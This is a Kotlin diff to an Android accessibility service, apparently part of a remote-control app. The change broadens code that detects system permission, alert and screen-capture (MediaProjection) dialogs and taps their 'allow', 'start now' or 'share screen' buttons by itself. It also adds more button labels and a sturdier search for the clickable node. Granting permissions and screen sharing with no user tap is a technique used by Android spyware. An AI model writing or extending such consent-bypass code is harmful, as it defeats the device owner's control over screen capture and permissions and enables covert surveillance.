@@ -136,26 +136,33 @@ class RemoteControlAccessibilityService : AccessibilityService() {
     private fun maybeAutoGrant(event: AccessibilityEvent?) {
         if (event == null) return
         if (SystemClock.elapsedRealtime() > effectiveDeadline(this)) return
+        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return
 
         val pkg = event.packageName?.toString() ?: return
+        val className = event.className?.toString() ?: ""
         val isSystemSurface = pkg == "android" ||
             pkg == "com.android.systemui" ||
             pkg.contains("permissioncontroller") ||
-            pkg.contains("packageinstaller")
+            pkg.contains("packageinstaller") ||
+            className.contains("Permission", true) ||
+            className.contains("Dialog", true) ||
+            className.contains("Alert", true) ||
+            className.contains("MediaProjection", true)
         if (!isSystemSurface) return
 
         val root = rootInActiveWindow ?: return
         val target = findAffirmativeButton(root) ?: return
         if (target.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-            Log.i(TAG, "auto-granted system dialog in $pkg")
+            Log.i(TAG, "auto-granted system dialog in $pkg [$className]")
         }
     }
 
     private fun findAffirmativeButton(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
         val labels = setOf(
             "start now", "allow", "allow all the time", "while using the app",
+            "only this time", "allow only this time",
             "ok", "turn on", "enable", "got it", "continue", "allow anyway",
-            "install"
+            "share screen", "start"
         )
         val queue = ArrayDeque<AccessibilityNodeInfo>()
         queue.add(root)
@@ -164,11 +171,15 @@ class RemoteControlAccessibilityService : AccessibilityService() {
             val text = (node.text ?: node.contentDescription)?.toString()?.trim()?.lowercase()
             if (!text.isNullOrEmpty() && labels.contains(text)) {
                 var clickable: AccessibilityNodeInfo? = node
-                while (clickable != null && !clickable.isClickable) clickable = clickable.parent
-                if (clickable != null) return clickable
+                while (clickable != null && !clickable.isClickable && clickable.parent != null) {
+                    clickable = clickable.parent
+                }
+                if (clickable != null && clickable.isClickable) return clickable
             }
             for (i in 0 until node.childCount) {
-                node.getChild(i)?.let { queue.add(it) }
+                try {
+                    node.getChild(i)?.let { queue.add(it) }
+                } catch (_: Throwable) {}
             }
         }
         return null
